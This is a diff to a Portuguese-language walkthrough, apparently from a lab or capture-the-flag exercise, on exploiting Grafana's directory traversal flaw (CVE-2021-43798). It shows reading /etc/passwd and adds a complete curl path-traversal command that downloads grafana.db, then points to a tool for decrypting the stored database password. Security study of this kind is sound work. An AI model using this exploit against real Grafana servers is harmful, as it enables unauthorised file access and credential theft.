@@ -53,3 +53,26 @@ python3 50581.py -H http://192.168.225.181:3000
 ![image](https://github.com/user-attachments/assets/cdc467f8-0379-4a69-bd21-4732682d6bdf)
 
 Conforme demonstrado na imagem acima, conseguimos ver claramente o arquivo **passwd** localizado no diretório **/etc**. Isso confirma que o exploit de **Directory Traversal** funcionou corretamente, permitindo o acesso a arquivos sensíveis do sistema, como o **/etc/passwd**, que contém informações sobre os usuários do sistema.
+
+É possível, utilizando a exploração do Grafana, recuperar a senha do banco de dados em texto plano. O processo envolve os seguintes passos:
+
+Primeiro, você precisa baixar o arquivo **grafana.db** usando o seguinte comando:
+
+```
+curl --path-as-is http://vulnerable.com:3000/public/plugins/alertlist/../../../../../../../../var/lib/grafana/grafana.db -o grafana.db
+```
+Lembre-se de que a senha está codificada dentro do **grafana.db**. Após extrair a senha do banco, basta inseri-la no código mencionado no repositório para decodificá-la e obter o acesso em texto plano.
+
+![image](https://github.com/user-attachments/assets/c351b5de-512d-4546-85fc-7ef03bdb8348)
+
+
+Depois de baixar o banco de dados, você pode utilizar uma ferramenta específica para decodificá-lo, como a disponível neste repositório: [Grafana-CVE-2021-43798](https://github.com/jas502n/Grafana-CVE-2021-43798).
+
+![image](https://github.com/user-attachments/assets/2e0187cf-2817-4ba2-81a1-456fc9e43251)
+
+![image](https://github.com/user-attachments/assets/f9ee9bf4-03ac-4930-8887-7dff92a475b6)
+
+
+
+
+
